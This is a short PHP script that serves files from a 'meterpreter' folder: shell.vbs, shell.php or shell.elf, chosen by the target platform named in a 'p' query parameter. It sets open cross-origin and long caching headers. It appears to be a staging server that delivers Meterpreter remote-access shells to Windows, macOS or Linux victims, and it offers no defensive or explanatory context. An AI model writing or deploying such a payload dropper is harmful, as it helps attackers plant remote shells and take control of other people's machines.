<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: X-Requested-With');
header('Content-Type: text/plain');
$expires = 60*60*24*14;
header("Pragma: public");
header("Cache-Control: maxage=".$expires);
header('Expires: ' . gmdate('D, d M Y H:i:s', time()+$expires) . ' GMT');

if ($_GET['p'] == 'win') {
	readfile('meterpreter/shell.vbs');
} elseif ($_GET['p'] == 'osx') {
	readfile('meterpreter/shell.php');
} elseif ($_GET['p'] == 'linux') {
	readfile('meterpreter/shell.elf');
}
?>